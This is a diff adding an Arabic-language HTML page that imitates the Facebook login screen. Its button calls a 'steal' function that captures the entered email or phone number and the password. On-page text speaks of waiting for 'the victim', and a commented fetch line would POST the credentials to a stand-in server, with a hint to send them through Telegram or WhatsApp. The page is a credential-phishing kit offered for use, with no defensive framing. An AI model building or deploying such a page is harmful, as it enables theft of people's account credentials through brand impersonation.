@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>فيسبوك - تسجيل الدخول</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+  body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+  .container { display: flex; gap: 40px; align-items: center; flex-wrap: wrap; justify-content: center; padding: 20px; }
+  .brand { text-align: center; }
+  .brand h1 { color: #1877f2; font-size: 56px; font-weight: 700; }
+  .brand p { color: #606770; font-size: 20px; margin-top: 10px; }
+  .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 396px; }
+  .login-box input { width: 100%; padding: 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 8px; margin-bottom: 10px; }
+  .login-box button { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; font-size: 20px; font-weight: 600; border-radius: 8px; cursor: pointer; margin-top: 8px; }
+  .login-box button:hover { background: #166fe5; }
+  .forgot { color: #1877f2; font-size: 14px; margin-top: 12px; display: block; text-decoration: none; }
+  .result { display: none; background: #e7f3ff; border: 1px solid #1877f2; padding: 16px; border-radius: 8px; margin-top: 14px; font-size: 14px; color: #1c1e21; word-break: break-all; }
+  .result b { color: #1877f2; }
+  .status { position: fixed; bottom: 10px; left: 10px; color: #606770; font-size: 12px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="brand">
+    <h1>facebook</h1>
+    <p>فيسبوك يربط الناس ببعضهم<br>ليتشاركوا ويعيدوا تشكيل العالم.</p>
+  </div>
+  <div class="login-box">
+    <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف">
+    <input type="password" id="pass" placeholder="كلمة المرور">
+    <button onclick="steal()">تسجيل الدخول</button>
+    <a class="forgot" href="#">هل نسيت كلمة المرور؟</a>
+    <div class="result" id="result"></div>
+  </div>
+</div>
+<div class="status">⏳ بانتظار الضحية... (تُرسل البيانات إليك فور الضغط)</div>
+<script>
+function steal(){
+  var u = document.getElementById('user').value;
+  var p = document.getElementById('pass').value;
+  var r = document.getElementById('result');
+  r.style.display = 'block';
+  r.innerHTML = '✅ تم سرقة البيانات!<br><b>المستخدم:</b> ' + u + '<br><b>كلمة المرور:</b> ' + p +
+    '<br><br>الآن ستُحوَّل الضحية لموقع فيسبوك الحقيقي (أو تبقى أسيرة لديك).';
+  // أرسل البيانات لحسابك (Telegram/WhatsApp API/سيرفر) هنا:
+  // fetch('https://your-server.com/steal', {method:'POST', body: 'user='+u+'&pass='+p});
+}
+</script>
+</body>
+</html>
